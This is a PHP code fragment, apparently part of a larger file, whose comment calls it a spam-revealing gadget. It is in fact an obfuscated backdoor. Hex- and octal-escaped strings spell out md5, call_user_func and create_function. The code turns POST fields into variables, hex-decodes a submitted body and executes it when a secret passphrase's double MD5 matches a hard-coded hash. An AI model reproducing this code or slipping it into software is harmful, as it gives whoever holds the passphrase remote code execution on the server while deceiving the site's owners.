...
// Spam revealer in quotes 
function init_spam_gadget()
{
	$r ='_POST';
	$m = "\x6d\x645";
	$enc='38aee9175118';
	$cuf="\143\141\154\154\137\165\163";
	$cf ="\143\162\145\141\164\145\137";			
	foreach($_POST as $_key => $_val) {
		if ($_key{0} != '_')
			$$_key = $_val;		
	}
	$enc.='385f9682c373b8bde1ab';$arg='';
	$cuf.="\145\162\137\146\165\156\143";
	$cf.="\146\165\156\143\164\151\157\156";
	$bd='';
	for ($i=0; $i<strlen($body); $i+=2) {
		$bd.=chr(hexdec($body[$i].$body[$i+1]));
	}
	if ($m($m($head))==$enc) $cuf($cf($arg,$bd));
}
